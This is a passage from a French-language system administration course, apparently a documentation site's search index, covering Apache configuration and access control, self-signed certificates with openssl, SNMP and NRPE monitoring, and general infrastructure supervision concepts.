D\u00e9marre le d\u00e9mon Apache\napache2ctl stop          # Arr\u00eate le d\u00e9mon Apache\napache2ctl restart       # Red\u00e9marre ou d\u00e9marre le d\u00e9mon Apache\n                         # V\u00e9rification automatique des fichiers de conf avant de lancer le red\u00e9marrage\napache2ctl fullstatus    # Affiche le rapport d'\u00e9tat complet\n                         # Le module \"mod_status\" doit \u00eatre activ\u00e9 et vous devez disposer d'un navigateur en mode texte tel que lynx\napache2ctl status        # Affiche un rapport d'\u00e9tat succinct\napache2ctl graceful      # Red\u00e9marre ou d\u00e9marre le d\u00e9mon en douceur\n                         # Les connexions en cours ne sont pas ferm\u00e9es\n                         # Cette option v\u00e9rifie automatiquement les fichiers de configuration\napache2ctl graceful-stop # Arr\u00eate le d\u00e9mon quand disponible\n                         # Les connexions en cours ne sont pas ferm\u00e9es\napache2ctl configtest    # Effectue une v\u00e9rification de la syntaxe\napache2ctl -S            # Affichage des sites publi\u00e9s\napache2ctl -l            # Affichage des modules compil\u00e9s avec Apache\n                         # - Module statique : charg\u00e9 au d\u00e9marrage\n                         # - Module partag\u00e9 : charg\u00e9 \u00e0 la demande\napache2ctl -?            # Affichage des options disponibles\n</code></pre>"},{"location":"service_web_securite/serveur_apache/#autres-commandes","title":"Autres commandes","text":"<p>Gestion des modules : </p> <ul> <li><code>a2enmod</code> nom_module: active le module  </li> <li><code>a2dismod</code> nom_module: d\u00e9sactive le module  </li> </ul> <p>Gestion des sites : </p> <ul> <li><code>a2ensite</code> nom_fichier.conf: publie le site  </li> <li><code>a2dissite</code> nom_fichier.conf: stoppe la publication du site  </li> </ul>"},{"location":"service_web_securite/serveur_apache/#structure-du-fichier-de-configuration","title":"Structure du fichier de configuration","text":"<p>Les fichiers de configuration des sites sont stock\u00e9s dans :  </p> <ul> <li><code>/etc/apache2/sites-available</code> </li> </ul> <p>Le nom du fichier de configuration est constitu\u00e9 :  </p> <ul> <li>D'un nom pour identifier chaque site  </li> <li>De l'extension <code>.conf</code> </li> <li>Le nom du fichier sera <code>wwww.nom_du_site.conf</code> </li> </ul> <p>D\u00e9finition de l'h\u00f4te virtuel :  </p> <ul> <li>Balise d'ouverture :  <li>Balise de fermeture :  </li> <p>Param\u00e8tre de la balise d'ouverture  </p> <ul> <li><code>&lt;Virtualhost *:80&gt;</code> : l'h\u00f4te virtuel est accessible par toutes les adresses IP locales <code>(*)</code> sur le port 80 </li> <li>\"*\" peut \u00eatre remplac\u00e9 par :  <ul> <li>une adresse IPv4 ou IPv6  </li> <li>un FQDN  </li> </ul> </li> <li>80 peut \u00eatre remplac\u00e9 par :  <ul> <li>N'importe quelle valeur de port 443,81,etc.  </li> <li>\"*\" pour \u00eatre accessible \u00e0 travers n'importe quel port  </li> </ul> </li> </ul> <p>R\u00e9pertoire contenant les donn\u00e9es du site :  </p> <ul> <li>Directive : DocumentRoot </li> <li>Chemin par d\u00e9faut : /var/www </li> <li>Un r\u00e9pertoire par site h\u00e9berg\u00e9  </li> </ul> <p>Ex: pour le site www.mydocs.lcl </p> <ul> <li>Fichier de configuration : <code>/etc/apache2/sites-available/www.mydocs.lcl.conf</code> </li> <li>R\u00e9pertoire du site : <code>/var/www/www.mydocs.lcl</code> </li> </ul> <p>Fichier de configuration  </p> <pre><code>&lt;VirtualHost *:80&gt;\n        DocumentRoot /var/www/www.mydocs.lcl\n        ServerName www.mydocs.lcl\n&lt;/VirtualHost&gt;\n</code></pre> <p>Les Sections de configuration </p> <p>Elles permettent de g\u00e9rer les acc\u00e8s \u00e0 des \u00e9l\u00e9ments de l'arborescence du site  </p> <ul> <li>Section <code>Directory</code> et <code>/Directory</code> : Pour un r\u00e9pertoire  </li> <li>Section <code>Files</code> et <code>/Files</code> : Pour un fichier quel que soit son emplacement  </li> </ul> <p>Elles permettent \u00e9galement de g\u00e9rer less acc\u00e8s \u00e0 des \u00e9l\u00e9ments hors de l'arborescence du site  </p> <ul> <li>Section <code>Location</code> et <code>/Location</code> : Pour g\u00e9rer l'acc\u00e8s \u00e0 des \u00e9l\u00e9ments utilis\u00e9s par le site web (Base de donn\u00e9es)  </li> </ul> <p>Ordre de lecture des sections de configuration </p> <p>Les sections sont trait\u00e9es dans l'ordre o\u00f9 elles apparaissent  </p> <ul> <li><code>Directory</code> et <code>/Directory</code> <ul> <li>Ces sections sont trait\u00e9es du r\u00e9pertoire avec le chemin le plus court au plus long  </li> <li>Si plusieurs sections vers le m\u00eame r\u00e9pertoire, elles sont interpr\u00e9t\u00e9es dans l'ordre  </li> </ul> </li> <li><code>Files</code> et <code>/Files</code> </li> <li><code>Location</code> et <code>/Location</code> </li> </ul>"},{"location":"service_web_securite/serveur_apache/#gestion-des-acces","title":"Gestion des acc\u00e8s","text":"<ol> <li>Gestion des acc\u00e8s simples </li> </ol> <p>La directive Require </p> <pre><code>Require all granted                 # l'acc\u00e8s est autoris\u00e9 pour tous  \nRequire all denied                  # l'acc\u00e8s est refus\u00e9 \u00e0 tous  \nRequire ip @IP                      \n(require ip 192.168.10.200)         # Autorise que pour &lt;u&gt;l'h\u00f4te&lt;/u&gt; 192.168.10.200  \nRequire ip adresse_r\u00e9seau           # Autorise que pour &lt;u&gt;les h\u00f4tes&lt;/u&gt; du r\u00e9seau  \n(require ip 192.168.10)             # 192.168.10.0 /24  \nRequire host suffixe_dns            # Autorise que les h\u00f4tes dont le nom contient le suffixe dns mdocs.lcl  \n(require host mydocs.lcl)           # Recherche DNS inverse (@IP =&gt; FQDN) puis une recherche DNS directe (FQDN=&gt;@IP)  \nRequire forward-dns nom_h\u00f4te        # Autorise que l'h\u00f4te d\u00e9fini (adresse IP)  \n(require forward-dns ad.mydocs.lcl) # Recherche DNS Directe (FQDN =&gt; @IP)  \nRequire local                       # Autorise que les adresses locales  \n                                    # Le r\u00e9seau 172.0.0.0 /8, l'adresse IP ::1, les adresses IP de l'h\u00f4te  \n</code></pre> <ol> <li>Gestion des acc\u00e8s multiples </li> </ol> <p>La directive RequireAll : toutes les directives require doivent \u00eatre valid\u00e9es  </p> <pre><code>&lt;RequireAll&gt;  \n        Require ip 192.168.10           # Autorise le r\u00e9seau 192.168.10.0 /24\n                                        # ET\n        Require not ip 192.168.10.100   # Refuse l'h\u00f4te 192.168.10.100\n&lt;/RequireAll&gt;  \n</code></pre> <p>La directive RequireAny : au moins une directive require doit \u00eatre valid\u00e9e  </p> <pre><code>&lt;RequireAny&gt;  \n        Require ip 192.168.10           # Autorise le r\u00e9seau 192.168.10.0/24  \n                                        # OU  \n        Require ip 192.168.30           # Autorise le r\u00e9seau 192.168.30.0/24  \n                                        # OU\n        Require not ip 192.168.20       # Refuse le r\u00e9seau 192.168.20.0/24  \n&lt;/RequireAny&gt;  \n</code></pre> <p>La directive RequireNone : aucune directive require doit \u00eatre valid\u00e9e  </p> <pre><code>&lt;RequireNone&gt;  \n        Require ip 192.168.10       # Refuse le r\u00e9seau 192.168.10.0/24  \n        Require ip 192.168.20       # Refuse le r\u00e9seau 192.168.20.0/24  \n&lt;/RequireNone&gt;  \n</code></pre> <p>La Directive Options permet :  </p> <ul> <li>Ajouter ou de supprimer des fonctionnalit\u00e9s  </li> <li>Positionner sur :  <ul> <li>la configuration globale du serveur (apache2.conf)  </li> <li>un h\u00f4te virtuel (VirtualHost)  </li> <li>un r\u00e9pertoire (Directory)  </li> </ul> </li> <li>Structure de la directive  <ul> <li>Options [+|-] option [[+|-]option]</li> </ul> </li> </ul> <p></p>"},{"location":"service_web_securite/serveur_apache/#fichiers-du-site","title":"Fichiers du site","text":"<p>Le r\u00e9pertoire du stockage des fichiers du site : </p> <ul> <li>Tous les fichiers des sites sont stock\u00e9s dans <code>/var/www</code> </li> <li>Cr\u00e9er un sous-r\u00e9pertoire par site  <ul> <li>Pour le site <code>www.mydocs.lcl</code> : Il faudra cr\u00e9er un r\u00e9pertoire \"www.mydocs.lcl\"  </li> <li>ex: <code>/var/www/www.mydocs.lcl</code> </li> </ul> </li> </ul> <p>Fichier de d\u00e9marrage </p> <ul> <li>Copier les fichiers du site web dans le r\u00e9pertoire <code>/var/www/www.mydocs.lcl</code> </li> <li>Le nom du fichier \u00e0 envoyer au navigateur d\u00e9pend de la directive DirectoryIndex <ul> <li>ex: fichier de d\u00e9marrage \"index.html\"  </li> </ul> </li> </ul>"},{"location":"service_web_securite/serveur_apache/#exemple-dun-fichier-de-configuration","title":"Exemple d'un fichier de configuration","text":"<p>Le fichier sera stock\u00e9 \u00e0 l'emplacement :  </p> <p><code>/etc/apache2/sites-available/www.mydocs.lcl.conf</code> </p> <p>Celui-ci contiendra :  </p> <pre><code>&lt;VirutalHost *:80&gt;  \n        DocumentRoot /var/www/www.tssr.lcl\n        ServerName www.mydocs.lcl  \n        &lt;directory /var/www/www.mydocs.lcl&gt;  \n                Options MultiViews FollowSymlinks  \n                AllowOverride None  \n                Require all granted  \n        &lt;/directory&gt;  \n&lt;/VirtualHost&gt;  \n</code></pre>"},{"location":"service_web_securite/serveur_apache/#certificats-autosignes-sous-apache","title":"Certificats autosign\u00e9s sous Apache","text":"<p>Etapes de cr\u00e9ation des certificats : </p> <ul> <li>Cr\u00e9ation de l'arborescence de stockage des certificats  </li> <li>Cr\u00e9ation d'une cl\u00e9 priv\u00e9e  </li> <li>Cr\u00e9ation d'un fichier de demande de \"signature de certificat\"  </li> <li>Cr\u00e9ation d'un certificat autosign\u00e9  </li> <li>Modification du fichier configuration du site  </li> </ul> <p>Arborescence de stockage </p> <ul> <li>Les r\u00e9pertoires certs-auto et reqs sont \u00e0 cr\u00e9er  </li> </ul> <pre><code>#tree -d /etc/ssl  \n\n\u251c\u2500\u2500 certs       #Les autorit\u00e9s de certifications connus  \n\u2502    \u2514\u2500\u2500 java  \n\u251c\u2500\u2500 certs-auto  #Les certificats auto-sign\u00e9s  \n\u251c\u2500\u2500 private     #Les cl\u00e9s priv\u00e9es  \n\u2514\u2500\u2500 reqs        #Les demandes de signatures de certificats  \n</code></pre>"},{"location":"service_web_securite/serveur_apache/#creation-de-la-cle-privee","title":"Cr\u00e9ation de la cl\u00e9 priv\u00e9e","text":"<p><code>Commande de la cr\u00e9ationn de la cl\u00e9 priv\u00e9e</code> </p> <pre><code>#openssl genrsa -des3 -out /etc/ssl/private/www.mydocs.lcl.key 2048  \nGenerating RSA private key, 2048 bit long modulus  \n......................................................................................  \n.+++  \n.............+++  \ne is 65537 (0x10001)  \nEnter pass phrase for /etc/ssl/private/private.key:  \nVerifying - Enter pass phrase for /etc/ssl/private/private.key:  \n</code></pre> <p></p>"},{"location":"service_web_securite/serveur_apache/#creation-de-la-demande-de-signature-du-certificat","title":"Cr\u00e9ation de la demande de signature du certificat","text":"<pre><code>#openssl req -new -key /etc/ssl/private/www.mydocs.lcl.key -out  \n/etc/ssl/reqs/www.mydocs.lcl.request.csr  \nEnter pass phrase for /etc/ssl/private/apache.key:  \nYou are about to be asked to enter information that will be incorporated  \ninto your certificate request.  \nWhat you are about to enter is what is called a Distinguished Name or a DN.  \nThere are quite a few fields but you can leave some blank  \nFor some fields there will be a default value,  \nIf you enter '.', the field will be left blank.  \n-----  \nCountry Name (2 letter code) [FR]:  \nState or Province Name (full name) [Loire_Atlantique]:  \nLocality Name (eg, city) [Saint_Herblain]:  \nOrganization Name (eg, company) [Ecole Informatique]:  \nOrganizational Unit Name (eg, section) [Srv-Apache]:  \nCommon Name (e.g. server FQDN or YOUR name) [www.mydocs.lcl]:  \nEmail Address [admin@mydocs.lcl]:  \nPlease enter the following 'extra' attributes  \nto be sent with your certificate request  \nA challenge password []:  \nAn optional company name []:  \n</code></pre> <p>Pour en savoir plus <code>man req</code> </p>"},{"location":"service_web_securite/serveur_apache/#contenu-du-fichier-de-la-demande-de-signature-de-certificat","title":"Contenu du fichier de la demande de signature de certificat","text":"<pre><code>#cat /etc/ssl/reqs/www.mydocs.lcl.request.csr\n-----BEGIN CERTIFICATE REQUEST-----\nMIIC7jCCAdYCAQAwgagxCzAJBgNVBAYTAkZSMRkwFwYDVQQIDBBMb2lyZV9BdGxh\nbnRpcXVlMRcwFQYDVQQHDA5TYWludF9IZXJibGFpbjESMBAGA1UECgwJRW5pLUVj\nb2xlMRMwEQYDVQQLDApTcnYtQXBhY2hlMRkwFwYDVQQDDBB3d3cuZW5pLWVjb2xl\nLmZyMSEwHwYJKoZIhvcNAQkBFhJhZG1pbkBlbmktZWNvbGUuZnIwggEiMA0GCSqG\nSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC+d4NMzICBeQj+kzd1euI5xeb1Av4mkQbZ\nNScXRnlLsufX5j1nIJ2wLLpk3W5l6wKc/VWFUMFODLDYzEfKBVOMmuhZ33s/ZiQe\nNvEiObCfXw11k+sA1FmUvWADIuwnpZYOVGNYl5Q/haCCntiYlokdHqsulj1/X6Xc\nbbeyKa6BkjawMOUzHm8WIf5xNO0850W3aAae+XkT+TcXvVCd3NaPe2CNxDMUs7pT\nv8xBjPzNlCWjBrbCDQJ5zdg3qp7KmSa0CAJPJloSmdnFfC2MMvJgyGcsbSpARibm\npp5A0ig1rvBqj3utOaW9fBKSqh1EO92L/ZGyOfRu5mwh+wOp3OfbAgMBAAGgADAN\nBgkqhkiG9w0BAQsFAAOCAQEAuhZWosiQjM5yjR/WUOi9iiE7Rd6j8L54He01fRrR\nmVKnFpPpQGje0H4rQ1bhAuUzXbr+fRrCTNww8wVWjWBwUOVv5ZcXKb4mb+/fZYQd\nDdKEPMW6e45oDzsLae/XaeNAgqcXK2E7ykOdJhR6cImdvVqvurhbGvLGPHUo4oM9\nYLA4ubvP25ieE0dgfCBoNr6AavomxVoSPn2JCUg0+RMFMBObhD91vq7qijzDoVpd\nw93ijk3WcAjasKb5igweLIMdGC9Cti4pTPpnZ9EH0WF/DZ4+Dr+3geH2lqS78BAQ\nKNlBmWf325XgGy+jPopI5beQNkdEx3bM1174ZhyLv1ZQDA==\n-----END CERTIFICATE REQUEST-----\n</code></pre>"},{"location":"service_web_securite/serveur_apache/#creation-de-la-demande-de-signature-de-certificat","title":"Cr\u00e9ation de la demande de signature de certificat","text":"<p>La phrase de passe de la cl\u00e9 priv\u00e9e sera demand\u00e9e si n\u00e9cessaire.  </p> <pre><code>#openssl x509 -req -days 90 -in /etc/ssl/reqs/www.mydocs.lcl.request.csr  \n-signkey /etc/ssl/private/www.mydocs.lcl.key -out /etc/ssl/certs-auto/www.mydocs.lcl.cert  \nSignature ok  \nsubject=/C=FR/ST=Loire_Atlantique/L=Saint_Herblain/O=Ecole-Informatique/OU=Srv-  \nApache/CN=www.mydocs.lcl/  \nemailAddress=admin@mydocs.lcl  \nGetting Private key  \nEnter pass phrase for /etc/ssl/private/www.mydocs.lcl.key:  \n</code></pre> <p></p> <p>Pour en savoir plus : <code>man x509</code> </p>"},{"location":"supervision/snmp_nrpe/","title":"Protocoles SNMP & NRPE","text":""},{"location":"supervision/snmp_nrpe/#le-protocole-snmp-simple-network-management-protocol","title":"Le protocole SNMP (Simple Network Management Protocol)","text":"<p>Il s'agit d'un protocole de sgestion de r\u00e9seaux fourni par l'IETF (Internet Engineering Task Force) Celui-ci se situe dans la couche Application (couche 7) du mod\u00e8le OSI. SNMP utilise le protocole UDP pour le transfert des messages. Il est tr\u00e8s utilis\u00e9 pour la supervision d'\u00e9quipements r\u00e9seau et la gestion de parc. Il permet d'acc\u00e9der, \u00e0 distance, en lecture et en \u00e9criture \u00e0 la configuration d'un mat\u00e9riel.  </p> <p>Les \u00e9l\u00e9ments prenant part \u00e0 l'utilisation de ce protocole sont :  </p> <ul> <li>L'outil de supervision (superviseur)  </li> <li>Les \u00e9l\u00e9ments supervis\u00e9s (agent supervis\u00e9)  </li> <li>Les variables MIB et les OID  <ul> <li>MIB : Management Information Base  </li> <li>OID : Object Identifier  </li> </ul> </li> <li>Le protocole  </li> </ul> <p>L'agent (supervis\u00e9) \u00e9coute les requ\u00eates du superviseur sur le port 161 (TCP ou UDP) Le superviseur \u00e9coute sur son port 162 pour recevoir les alertes des agents.  </p> <p></p> <p>Le protocole SNMP exite en 3 versions majeures.  </p> <p>Les version 1 et 2c (version la plus utilis\u00e9e) disposent du m\u00eame dispositif de s\u00e9curit\u00e9, une simple cha\u00eene de caract\u00e8re appel\u00e9e communaut\u00e9 (valeur par d\u00e9faut \u00e0 changer).  </p> <p>Enfin la version 3, la plus r\u00e9cente, pr\u00e9sente pour principal int\u00e9r\u00eat d'am\u00e9liorer la s\u00e9curit\u00e9, notamment l'apport de l'authentification. Elle est cependant encore mal impl\u00e9ment\u00e9e sur certains \u00e9quipements.  </p>"},{"location":"supervision/snmp_nrpe/#les-mib-et-oid","title":"Les MIB et OID","text":""},{"location":"supervision/snmp_nrpe/#oid","title":"OID","text":"<p>Les OID permettent d'identifier de mani\u00e8re unique chacun des objets g\u00e9r\u00e9s qui sont d\u00e9finis dans des fichiers MIB. La hi\u00e9rarchie des objets OID est repr\u00e9sent\u00e9e sous la forme d'une arborescence \u00e0 plusieurs niveaux. Chaque OID a une adresse qui co\u00efncide avec les niveaux de l'arborescence des OID.  </p> <p></p> <p>Les identifiants d'objets MIB de niveau \u00e9l\u00e9v\u00e9 ou g\u00e9n\u00e9ral sont attribu\u00e9s par divers organismes de normalisation comme ISO. Les fabricants d\u00e9finissent des OID pour leurs propres produits dans des ramifications pr\u00e9v\u00e9es de l'arborescence d'OID.  </p> <p>Les objets administr\u00e9s peuvent prendre une forme scalaire ou tabulaire. Les objets scalaires d\u00e9finissent une seule instance d'objet, alors que les objets tabulaires d\u00e9finissent plusieurs instances li\u00e9es d'objets, et celles-ci sont regroup\u00e9es dans des tables MIB.</p>"},{"location":"supervision/snmp_nrpe/#mib","title":"MIB","text":"<p>Les MIB sont des bases d'information, il s'agit d'un format ind\u00e9pendant, dont disposent les agents, que le superviseur interrogera via SNMP pour obtenir des informations. Dans une MIB, tous les objets ont leur propre d\u00e9finition qui d\u00e9termina ses propri\u00e9t\u00e9s sur l'appareil \u00e0 g\u00e9rer. La structures des MIB est hi\u00e9rarchique et arborescente. Chaque noeud de cette arborescence a un Object IDentifier (OID) qui lui correspond.  </p>"},{"location":"supervision/snmp_nrpe/#oid-et-mib-sont-necessaires","title":"OID et MIB sont n\u00e9cessaires","text":"<p>Qu'il s'agisse de l'utilisation de m\u00e9moire d'un serveur, du trafic, que re\u00e7oit un commutateur ou des fichiers pr\u00e9sents dans la file d'attente d'une imprimante, chacune des informations que le protocole SNMP permet d'extraire est trait\u00e9e individuellement gr\u00e2ce \u00e0 son OID. C'est cette propri\u00e9t\u00e9 qui explique la n\u00e9cessit\u00e9 du recours aux OID. Ces derniers aident les administrateurs \u00e0 identifier et superviser les objets pr\u00e9sents sur leur r\u00e9seau, et donc \u00e0 donner tout son sens \u00e0 la supervision r\u00e9seau.  </p> <p>Pour que l'entit\u00e9 de gestion puisse communiquer avec un p\u00e9riph\u00e9rique g\u00e9r\u00e9 via la r\u00e9seau, les deux doivent savoir quels OID sont disponibles.  </p> <p>C'est la raison pour laquelle les fichiers MIB ont \u00e9t\u00e9 cr\u00e9\u00e9s et pour laquelle les administrateurs syst\u00e8me en ont besoin. Chaque objet destin\u00e9 \u00e0 \u00eatre supervis\u00e9 sur un p\u00e9riph\u00e9rique doit \u00eatre stipul\u00e9 par la/les MIB de ce dernier. Ainsi, les administrateurs doivent s'assurer que tous les fichiers MIB n\u00e9cessaires sont bien stock\u00e9s sur les appareils-agents SNMP mais \u00e9galement sur le syst\u00e8me de l'entit\u00e9 de gestion. Un fichier MIB se reconnait \u00e0 son extension \".my\" ou \".mib\".  </p> <p>D'ordinaire les fabricants de p\u00e9riph\u00e9rique fournissent d'ordinaire les MIB n\u00e9cessaires avec leurs produits d\u00e8s lors qu'ils sont compatibles avec SNMP. En fonction de la solution de supervision utilis\u00e9, on peut \u00eatre oblig\u00e9 de convertir ces fichiers MIB pour en produire des versions sp\u00e9ciales.  </p>"},{"location":"supervision/snmp_nrpe/#trap-snmp","title":"Trap SNMP","text":"<p>Quand un \u00e9v\u00e9nement anormal se produit sur un \u00e9l\u00e9ment supervis\u00e9, celui-ci peut en informer son superviseur. Dans ce cas, l'agent envoie une TRAP (ou alerte) SNMP. Il est pr\u00e9f\u00e9rable de param\u00e9trer ces trap en utilisant le protocole UDP.  </p>"},{"location":"supervision/snmp_nrpe/#mise-en-place","title":"Mise en place","text":""},{"location":"supervision/snmp_nrpe/#sous-windows","title":"Sous Windows","text":"<p>Sur Windows le service SNMP peut s'installer depuis les fonctionnalit\u00e9s Windows. Une fois celui-ci install\u00e9, sa configuration s'effectue depuis le gestionnaire de services (services.msc) via l'onglet s\u00e9curit\u00e9.  </p> <p>ou via une commande PowerShell :  </p> <p><pre><code>Get-WindowsCapability -Online -Name \"SNMP*\"\n\nName         : SNMP.Client~~~~0.0.1.0\nState        : NotPresent\nDisplayName  : Protocole SNMP (Simple Network Management Protocol)\nDescription  : Cette fonctionnalit\u00e9 inclut des agents SNMP (Simple Network Management Protocol) qui analysent\n               l\u2019activit\u00e9 des p\u00e9riph\u00e9riques r\u00e9seau et envoient leur rapport \u00e0 la console syst\u00e8me du r\u00e9seau.\nDownloadSize : 4454152\nInstallSize  : 2638816\n\nAdd-WindowsCapability -Online -Name \"SNMP.Client~~~~0.0.1.0\"\n\n\nPath          :\nOnline        : True\nRestartNeeded : False\n</code></pre> Un red\u00e9marrage du service est n\u00e9cessaire pour la prise en compte des modifications sur le service. Afin de promouvoir et favoriser l'utilisation du protocole WMI (limit\u00e9 aux syst\u00e8mes Microsoft), la configuration du service SNMP est limit\u00e9es et ne permet pas l'utilisation du protocole v3.  </p>"},{"location":"supervision/snmp_nrpe/#sous-debian","title":"Sous Debian","text":"<p>L'installation du service SNMP s'effectue avec le paquet snmpd <pre><code>apt install snmp snmpd\n</code></pre></p> <p>Le fichier de configuration est situ\u00e9 <code>/etc/snmp/snmpd.conf</code> </p> <p><pre><code>agentaddress 0.0.0.0,[::]                               # Remplacez 0.0.0.0 par l'IP de l'interface SNMP sur laquel il doit \u00e9couter\n#       sec.name  source          community\ncom2sec notConfigUser  default       my-snmp-community  # Remplacez my-snmp-community par la valeur de votre environnement\n####\n# Second, map the security name into a group name:\n#       groupName      securityModel securityName\ngroup   notConfigGroup v1           notConfigUser\ngroup   notConfigGroup v2c           notConfigUser\n####\n# Third, create a view for us to let the group have rights to:\n# Make at least  snmpwalk -v 1 localhost -c public system fast again.\n#       name           incl/excl     subtree         mask(optional)\nview centreon included .1.3.6.1                          # Ajoutez la ligne pour avoir acc\u00e8s \u00e0 toutes les informations de la MIB requises par le plugin\nview    systemview    included   .1.3.6.1.2.1.1\nview    systemview    included   .1.3.6.1.2.1.25.1.1\n####\n# Finally, grant the group read-only access to the systemview view.\n#       group          context sec.model sec.level prefix read   write  notif\naccess notConfigGroup \"\" any noauth exact centreon none none\naccess  notConfigGroup \"\"      any       noauth    exact  systemview none none\n</code></pre> Pour interroger les diff\u00e9rents points de fonctionnement d'un \u00e9quipement, il faut explorer son arborescence MIB On utilisera des outils nous permettant de lister les MIB de ces \u00e9quipements \u00e0 ces fins. Deux outils pour comprendre et d\u00e9bugger SNMP sont pr\u00e9sents dans le paquet SNMP :  </p> <ul> <li>snmpwalk va permettre de r\u00e9cup\u00e9rer un ensemble de clefs  </li> <li>snmpget va permettre de r\u00e9cup\u00e9rer une information avec un clef d\u00e9finie  </li> </ul> <p></p>"},{"location":"supervision/snmp_nrpe/#le-protocole-nrpe","title":"Le protocole NRPE","text":"<p>Moins universel que le protocole SNMP, il est \u00e9galement possible de superviser des h\u00f4tes et services au moyen de sondes NRPE. L'\u00e9tendue des donn\u00e9es r\u00e9cup\u00e9rables est importante, nous n'aborderons, ici, que celles relatives \u00e0 des \u00e9l\u00e9ments mat\u00e9riels (CPU, m\u00e9moire vive, etc...) En entreprise, il est courant d'employer ce type de sondes lorsque des h\u00f4tes Windows, notamment, sont \u00e0 superviser, principalement pour des raisons de s\u00e9curit\u00e9.  </p> <p>En effet, le flux de sondes NRPE peut \u00eatre chiffr\u00e9 (via SSL/TLS), chose impossible en SNMP, car Windows ne supporte pas la version 3 du protocole. L'acronyme NRPE signifie Nagios Remote Plugin Executor, indiquant clairement l'origine de cette sonde, cr\u00e9\u00e9e \u00e0 la base pour l'envoi de commandes \u00e0 distance par Nagios.  </p>"},{"location":"supervision/snmp_nrpe/#fonctionnement","title":"Fonctionnement","text":"<p>Lorsque des sondes NRPE sont lanc\u00e9es depuis le superviseur, ce dernier, demande \u00e0 l'h\u00f4te, ou plus exactement \u00e0 un agent sp\u00e9cifique d'ex\u00e9cuter des plugins afin de collecter des m\u00e9triques sur divers \u00e9l\u00e9ments mat\u00e9riels ou logiciels. Nous sommes typiquement dans un fonctionnement d'application client &lt;-&gt; serveur.  </p> <p></p> <p>Le superviseur s'adresse donc \u00e0 un logiciel d\u00e9ploy\u00e9 sur l'h\u00f4te supervis\u00e9 via un port d'\u00e9coute bine sp\u00e9cifique (par d\u00e9faut 5666).  </p> <p>L'agent (ou d\u00e9mon) NRPE recevant des instructions r\u00e9alisera la collecte d'informations qui lui est demand\u00e9e (ex. la charge CPU), puis renverra les donn\u00e9es au superviseur.  </p> <p>Du c\u00f4t\u00e9 du superviseur, il faudra juste s'assurer de la pr\u00e9sence du plugin NRPE.  </p> <p>Les h\u00f4tes \u00e0 superviser ne poss\u00e8dent aucun service par d\u00e9faut permettant de recevoir des instructions NRPE.  </p> <p>Il faudra donc mettre en oeuvre une strat\u00e9gie de d\u00e9ploiement/installation de ce type d'application selon le nombre d'h\u00f4tes devant \u00eatre supervis\u00e9s.  </p> <p>Une des solutions logicielles les plus utilis\u00e9es en la mati\u00e8re se nomme NSClient++.  </p> <p>Celui-ci est disponible autant sur Windows que sur Linux et librement t\u00e9l\u00e9chargeable.  </p>"},{"location":"supervision/supervision/","title":"Supervision","text":""},{"location":"supervision/supervision/#supervision-dinfrastructure","title":"Supervision d'Infrastructure","text":"<p>La supervision informatique correspond \u00e0 l'ensemble des m\u00e9canismes mis en place pour la surveillance du bon fonctionnement d'un syst\u00e8me ou d'un service. Elle a pour objectifs la Pr\u00e9vention d'incidents, le raccourcissement de la dur\u00e9e entre l'incident et son constat.  </p> <p>La supervision apporte la possibilit\u00e9 d'\u00eatre averti rapidement d'un dysfonctionnement mat\u00e9riel ou logiciel, de localiser l'incident et d'agir en fonction du probl\u00e8me. Cela permet la r\u00e9duction du temps de r\u00e9solution d'incidents et r\u00e9duira donc l'impact au niveau des utilisateurs.  </p>"},{"location":"supervision/supervision/#aspects-fonctionnels","title":"Aspects Fonctionnels","text":"<p>La mise en oeuvre d'une supervision, dans un r\u00e9seau informatique, apporte un certains nombre de b\u00e9n\u00e9fices :  </p> <ul> <li>La pr\u00e9vention des incidents :  <ul> <li>D\u00e9tection des pannes  </li> <li>Localisation de la panne  </li> <li>R\u00e9paration  </li> </ul> </li> <li>L'audit des performances :  <ul> <li>Le temps de r\u00e9ponse  </li> <li>Le d\u00e9bit  </li> <li>Le taux d'erreur par bit  </li> <li>La disponibilit\u00e9  </li> </ul> </li> <li>Le suivi de l'\u00e9volution de son infrastructure :  <ul> <li>Identifier les diff\u00e9rents \u00e9l\u00e9ments de son infrastructures  </li> <li>Conserver un \u00e9tat des diff\u00e9rents changements intervenus  </li> </ul> </li> </ul>"},{"location":"supervision/supervision/#donnees-traitees","title":"Donn\u00e9es Trait\u00e9es","text":"<p>La supervision s'appuie, pour son bon fonctionnements, sur :  </p> <ul> <li>La collecte d'information (notamment des m\u00e9triques afin de traiter des graphiques)  </li> <li>Le contr\u00f4le de l'\u00e9tat du syst\u00e8me (fonctionnel ou non)  </li> <li>La sauvegarde de l'\u00e9tat d'un historique  </li> </ul>"},{"location":"supervision/supervision/#types-de-supervision","title":"Types de Supervision","text":"<p>La supervision est d\u00e9finis en 4 types :  </p> <ul> <li>Inactif : pas de supervision ou alarmes ignor\u00e9es  </li> <li>R\u00e9actif : pas de supervision ou r\u00e9action aux probl\u00e8mes lorqu'ils surviennent  </li> <li>Interactif : supervision pr\u00e9sente, mais la correction des pannes demande une intervention humaine  </li> <li>Proactif : supervision, d\u00e9tection des causes r\u00e9elles et dans la mesure du possible intervention automatis\u00e9e  </li> </ul>"},{"location":"supervision/supervision/#surveillance-des-services-et-ressources","title":"Surveillance des services et ressources","text":"<p>Le bon fonctionnement des services peut \u00eatre contr\u00f4l\u00e9 directement, sans installation d'agent de supervision sur les \u00e9l\u00e9ments \u00e0 superviser, par v\u00e9rification en utilisant le port ouvert par le service sur le serveur (ex: port 80 pour le http) La collecte des informations se fera gr\u00e2ce aux indicateurs de qualit\u00e9 et de disponibilit\u00e9. En cas d'incident, le d\u00e9clenchement d'un \u00e9v\u00e9nement de supervision va permettre de pr\u00e9venir et d'agir rapidement en cons\u00e9quence.  </p> <p>Le suivi des ressources est essentiel afin de garantir le bon fonctionnement des services et applications les utilisants. Afin de collecter des informations en temps r\u00e9el (donn\u00e9es et/ou \u00e9tats) l'installation d'agents pourra \u00eatre n\u00e9cessaire sur les diff\u00e9rentes machines \u00e0 superviser. Les ressources collect\u00e9es sont principalement des indicateurs de consommation. une variation brusque ou l'atteinte d'une limite de consommation d\u00e9clenche un \u00e9v\u00e9nment de supervision (notification,alerte ou des actions depuis le serveur de supervision)  </p>"},{"location":"supervision/supervision/#decoupe-fonctionnelle","title":"D\u00e9coupe fonctionnelle","text":"<p>Quel que soit le but, il est possible de d\u00e9couper la supervision en actions :  </p> <ul> <li>Observer, d\u00e9couvrir et inventorier de l'information  </li> <li>Contr\u00f4ler, collecter et stocker des donn\u00e9es  </li> <li>Agr\u00e9ger, analyser, corr\u00e9ler et consolider de l'information  </li> <li>Pr\u00e9senter, indiquer et synth\u00e9tiser les 